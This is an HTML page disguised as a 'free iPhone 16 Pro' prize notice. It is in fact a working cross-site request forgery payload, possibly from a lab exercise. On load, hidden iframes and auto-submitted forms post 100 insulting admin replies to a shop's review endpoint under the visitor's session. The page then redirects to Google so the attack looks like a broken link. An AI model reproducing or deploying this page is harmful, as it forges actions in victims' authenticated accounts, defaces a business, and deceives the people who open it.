
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🎉 You Won a Free iPhone!</title>
    <style>
        * { box-sizing: border-box; }
        body {
            margin: 0;
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            text-align: center;
            padding: 20px;
            overflow: hidden;
        }
        .card {
            background: rgba(255, 255, 255, 0.12);
            backdrop-filter: blur(14px);
            -webkit-backdrop-filter: blur(14px);
            border: 1px solid rgba(255, 255, 255, 0.25);
            border-radius: 24px;
            padding: 50px 40px;
            max-width: 460px;
            width: 100%;
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.35);
            animation: pop .6s ease-out;
        }
        @keyframes pop {
            from { transform: scale(.85); opacity: 0; }
            to   { transform: scale(1);   opacity: 1; }
        }
        .emoji {
            font-size: 80px;
            margin-bottom: 10px;
            animation: bounce 1.5s infinite;
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50%      { transform: translateY(-12px); }
        }
        h1 {
            font-size: 32px;
            margin: 0 0 12px;
            font-weight: 800;
            letter-spacing: -0.5px;
        }
        p {
            font-size: 17px;
            opacity: .92;
            line-height: 1.5;
            margin: 0 0 26px;
        }
        .spinner {
            width: 44px;
            height: 44px;
            border: 4px solid rgba(255, 255, 255, 0.25);
            border-top-color: #fff;
            border-radius: 50%;
            margin: 0 auto;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .small {
            display: block;
            margin-top: 22px;
            font-size: 13px;
            opacity: .75;
        }
    </style>
</head>
<body onload="launchAttack()">
    <div class="card">
        <img src="../assets/images/productsImg/helpers/shopping.webp" alt="Prize" style="width: 180px; height: auto; margin-bottom: 18px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.3);">
        <h1>Congratulations!</h1>
        <p>You've been selected to win a brand new <strong>iPhone 16 Pro</strong>!<br>Redirecting you to claim your prize...</p>
        <div class="spinner"></div>
        <span class="small">Please do not close this page.</span>
    </div>

    <div id="attack-containers" style="display: none !important;"></div>

    <script>
        function launchAttack() {
            // change to the attacker server url
            const targetUrl = "http://192.168.1.66:8000/admin_reply.php";
            const insults = [
                "Stop complaining! You are just a boring person.",
                "Don't buy here again, we don't like you.",
                "Your review is as bad as your personality.",
                "Actually, we spit on your toaster before delivery."
            ];

            const container = document.getElementById("attack-containers");

            for (let i = 1; i <= 100; i++) {
                const iframe = document.createElement("iframe");
                iframe.name = "hidden_frame_" + i;
                iframe.style.display = "none";
                // Now appending to the invisible container
                container.appendChild(iframe);

                const form = document.createElement("form");
                form.method = "POST";
                form.action = targetUrl;
                form.target = iframe.name;
                
                const idInput = document.createElement("input");
                idInput.name = "review_id";
                idInput.value = i;

                const contentInput = document.createElement("input");
                contentInput.name = "reply_content";
                contentInput.value = insults[Math.floor(Math.random() * insults.length)];

                form.appendChild(idInput);
                form.appendChild(contentInput);
                
                // Now appending to the invisible container
                container.appendChild(form);

                form.submit();
            }

            //send the user back to google so he will think the link is just broken
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 2000);
        }
    </script>
</body>
</html>
